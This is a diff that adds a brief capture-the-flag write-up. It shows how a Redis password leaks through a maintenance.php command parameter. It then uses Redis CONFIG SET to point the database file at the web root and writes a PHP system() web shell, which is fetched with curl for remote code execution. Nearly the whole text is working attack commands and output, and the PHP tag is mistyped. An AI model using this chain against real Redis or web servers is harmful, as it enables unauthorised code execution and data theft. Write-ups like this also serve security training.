@@ -1,0 +1,26 @@
+curl http://localhost/maintenance.php?cmd=info |grep db
+
+> db0:keys=2,expires=0,avg_ttl=0
+
+cmd=config,get,*
+> R3disp@ss
+
+now we can interact with redis directly:
+
+redis-cli
+> AUTH R3disp@ss
+OK
+
+Now that we have access to redis we have remote code execution (by design!) see: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+
+> config set dir /var/www/html (obtained from us checking that directory for easy pwn at start of challenge - got permission denied)
+> config set dbfilename test.php
+> set test "<?php system('cat index.php')>?"
+> save
+OK
+>exit
+
+curl http://localhost/test.php --output outfile
+cat outfile
+
+- slixperi
